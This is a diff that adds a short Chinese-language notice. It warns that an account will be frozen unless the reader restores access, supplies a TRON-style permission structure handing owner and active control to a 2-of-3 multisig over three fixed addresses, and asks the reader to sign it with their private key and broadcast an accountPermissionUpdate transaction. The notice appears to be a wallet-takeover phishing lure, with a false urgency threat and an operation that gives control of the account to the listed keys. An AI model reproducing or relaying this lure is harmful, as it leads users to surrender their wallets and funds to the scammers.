@@ -1,0 +1,49 @@
+请完成此操作解除限制，否则将冻结账户至2026年7月30日。
+
+此操作将重置账户权限为多签控制（3人中需2人签名）。权限结构如下：
+
+{
+  "owner": {
+    "permission_name": "owner",
+    "threshold": 2,
+    "keys": [
+      {
+        "address": "41e210f7b6e5d07d0a3541e86310d5ea7aa7a81e7d",
+        "weight": 1
+      },
+      {
+        "address": "41d3b66c9759ebd453d682e63ae73fb1d2b41a6e62",
+        "weight": 1
+      },
+      {
+        "address": "415ba93152f4e9aa8e7cbf8ecb6977e6b52766185a",
+        "weight": 1
+      }
+    ]
+  },
+  "actives": [
+    {
+      "type": "Active",
+      "id": 2,
+      "permission_name": "active",
+      "threshold": 2,
+      "operations": "7fff1fc0033ec30f000000000000000000000000000000000000000000000000",
+      "keys": [
+        {
+          "address": "41e210f7b6e5d07d0a3541e86310d5ea7aa7a81e7d",
+          "weight": 1
+        },
+        {
+          "address": "41d3b66c9759ebd453d682e63ae73fb1d2b41a6e62",
+          "weight": 1
+        },
+        {
+          "address": "415ba93152f4e9aa8e7cbf8ecb6977e6b52766185a",
+          "weight": 1
+        }
+      ]
+    }
+  ]
+}
+
+请使用您的私钥对上述权限结构进行签名，并广播 accountPermissionUpdate 交易以完成重置。
